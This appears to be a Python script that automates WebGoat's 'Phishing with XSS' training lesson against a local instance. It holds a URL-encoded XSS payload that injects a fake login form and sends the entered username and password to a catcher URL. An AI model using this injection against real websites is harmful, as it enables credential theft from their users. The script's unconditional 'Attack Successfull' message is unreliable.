import requests
import pprint



attack_string = 'Username=%3C%2Fform%3E%3Cscript%3Efunction+hack()%7B+XSSImage%3Dnew+Image%3B+XSSImage.src%3D%22http%3A%2F%2Flocalhost%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26user%3D%22%2B+document.phish.user.value+%2B+%22%26password%3D%22+%2B+document.phish.pass.value+%2B+%22%22%3B+alert(%22Had+this+been+a+real+attack...+Your+credentials+were+just+stolen.+User+Name+%3D+%22+%2B+document.phish.user.value+%2B+%22Password+%3D+%22+%2B+document.phish.pass.value)%3B%7D+%3C%2Fscript%3E%3Cform+name%3D%22phish%22%3E%3Cbr%3E%3Cbr%3E%3CHR%3E%3CH3%3EThis+feature+requires+account+login%3A%3C%2FH3+%3E%3Cbr%3E%3Cbr%3EEnter+Username%3A%3Cbr%3E%3Cinput+type%3D%22text%22+name%3D%22user%22%3E%3Cbr%3EEnter+Password%3A%3Cbr%3E%3Cinput+type%3D%22password%22+name+%3D+%22pass%22%3E%3Cbr%3E%3Cinput+type%3D%22submit%22+name%3D%22login%22+value%3D%22login%22+onclick%3D%22hack()%22%3E%3C%2Fform%3E%3Cbr%3E%3Cbr%3E%3CHR&SUBMIT=Search'



with requests.Session() as s:
    # Request login page
    #Log into WebGoat
    url = 'http://127.0.0.1:8080/WebGoat'
    values = {'username': 'guest',
            'password': 'guest'}

    r = s.post(url+'/j_spring_security_check', values)
    r = s.get(url + '/welcome.mvc')
    r = s.get(url +'/start.mvc')
    r = s.get(url + '/service/lessonmenu.mvc')
    r = s.get(url + '/attack?Screen=32&menu=5')
    r = s.get(url + '/service/lessonmenu.mvc')

    broad_xss_menu = list(filter(lambda menu_test: menu_test["name"] == "Cross-Site Scripting (XSS)", r.json))
    my_entry = list(filter(lambda menu_test: menu_test["name"] == "Phishing with XSS", broad_xss_menu[0]['children']))
    attack_url = "/" + my_entry[0]['link']
    
    print(attack_url)


    r = s.get(url + '/service/lessontitle.mvc')
    r = s.get(url + '/service/cookie.mvc')
    r = s.get(url +'/service/lessonplan.mvc')
    r = s.get(url +'/service/solution.mvc')
    r = s.get(url+ attack_url)
    r = s.get(url + '/service/lessonmenu.mvc')
    r = s.get(url + '/service/lessontitle.mvc')
    r = s.get(url + '/service/cookie.mvc')
    r = s.get(url +'/service/hint.mvc') 
    r = s.get(url +'/service/source.mvc') 
    r = s.get(url +'/service/lessonplan.mvc')
    r = s.get(url +'/service/solution.mvc')
    r = s.post(url + attack_url, attack_string )
    print(r.content)
    r = s.get(url + '/service/cookie.mvc')
    r = s.get(url + '/service/lessonmenu.mvc')

# Figure out which menu item is "Http Basics"

# Request the lesson for General => Http Basics

# Submit the attack to the General => Http Basics page

# Purposefully fail for testing purposes

#if successfull, say so otherwise don't #logic
print("Attack Successfull")

